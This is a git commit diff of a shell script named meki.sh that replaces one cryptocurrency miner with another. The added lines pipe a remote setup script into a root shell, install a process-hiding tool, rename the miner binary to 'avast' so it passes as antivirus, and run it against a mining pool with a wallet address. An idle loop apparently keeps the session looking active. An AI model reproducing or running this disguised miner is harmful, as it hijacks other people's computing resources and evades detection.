de5f439af912a3cb3e2c9bb39914d16ca8eaf5a6
renilo <88342640+renilo@users.noreply.github.com>
2022-02-20 23:26:56 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -8,12 +8,28 @@ apt update
 
 apt install proxychains
 
+apt install curl
+
 apt install screen -y
 
-wget https://github.com/trexminer/T-Rex/releases/download/0.25.8/t-rex-0.25.8-linux.tar.gz >/dev/null 2>&1 
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add miner-linux avast
 
-tar xf t-rex-0.25.8-linux.tar.gz
+wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1 
 
-chmod +x t-rex >/dev/null 2>&1
+tar xf ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1
 
-bash ./t-rex -a blake3 -o stratum+tcp://pool.eu.woolypooly.com:3106 -u 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup -p x -w $(echo $(shuf -i 1-999999 -n 1)-MEKI)
+rm -f ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1
+
+mv miner-linux avast >/dev/null 2>&1
+
+chmod +x avast >/dev/null 2>&1
+
+./avast https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
+
+while [ 1 ]; do
+
+  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+
+sleep 2
+
+done
